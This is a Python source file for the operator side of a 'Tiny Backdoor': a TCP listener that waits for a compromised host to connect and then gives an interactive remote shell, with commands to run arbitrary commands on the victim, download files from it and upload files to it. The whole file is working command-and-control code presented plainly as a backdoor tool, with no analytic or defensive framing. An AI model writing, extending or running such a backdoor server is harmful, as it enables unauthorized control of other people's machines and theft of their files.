import os
import socket
import json
import sys
import argparse


def send(data, target):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def upload_file(file, target):
    f = open(file, 'rb')
    target.send(f.read())


def download_file(file, target):
    f = open(file, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def listen(target, ip):
    while True:
        command = input('> Shell~%s: ' % str(ip))
        send(command, target)

        if command == 'exit':
            break
        elif command == 'help':
            print('=== Tiny Backdoor Commands ===')
            print('clear: Clear the terminal')
            print('cd <dir>: Change directory')
            print('download <file>: Download a file from remote host')
            print('upload <file>: Upload a file to remote host')
            print('exit: Close the active session')
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:], target)
        elif command[:6] == 'upload':
            upload_file(command[7:], target)
        else:
            result = recv(target)
            print(result)


def run(lhost, lport):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((lhost, int(lport)))
    print(f'[+] Running server {lhost}:{lport}')
    print('[+] Listening for the incoming connections ...')
    sock.listen()
    target, ip = sock.accept()
    print(f'[+] Target connected from: {str(ip)}')
    print(f'[help] Type exit command to quit the running program')
    listen(target, ip)


def arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(add_help=True, description='Server for incoming backdoor connection')
    parser.add_argument('-lh', '--lhost', help='LOCAL HOST IP', dest='lhost', required=True, type=str)
    parser.add_argument('-lp', '--lport', help='LOCAL HOST PORT', dest='lport', default=7777, type=int)
    parser.set_defaults(func=run)
    return parser


if __name__ == "__main__":
    if len(sys.argv) <= 2:
        args = arg_parser().parse_args(['-h'])
        sys.exit(1)
    else:
        args = arg_parser().parse_args()
        args.func(args.lhost, args.lport)
